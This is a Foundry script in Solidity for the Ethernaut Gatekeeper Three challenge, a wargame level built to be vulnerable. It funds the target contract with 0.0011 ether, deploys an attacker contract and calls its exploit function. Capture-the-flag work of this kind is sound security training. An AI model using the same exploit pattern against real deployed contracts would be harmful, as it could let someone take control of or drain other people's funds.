// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IGatekeeperThree } from "ethernaut/28-gatekeeper-three/IGatekeeperThree.sol";
import { GatekeeperThreeAttacker } from "ethernaut/28-gatekeeper-three/GatekeeperThreeAttacker.sol";

contract GatekeeperThreeScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address gatekeeperThreeAddr = vm.envAddress("L28_GATEKEEPER_THREE_ADDRESS");
        IGatekeeperThree gateKeeperThree = IGatekeeperThree(payable(gatekeeperThreeAddr));

        // Step 1: fund GatekeeperThree with more than 0.001 ether (required to pass gateThree() modifier)
        // solhint-disable-next-line avoid-low-level-calls
        (bool success,) = address(gateKeeperThree).call{value: 0.0011 ether}("");

        // Step 1: deploy attacker
        GatekeeperThreeAttacker gatekeeperThreeAttacker = new GatekeeperThreeAttacker(payable(gatekeeperThreeAddr));

        gatekeeperThreeAttacker.exploit();

        vm.stopBroadcast();
    }
}
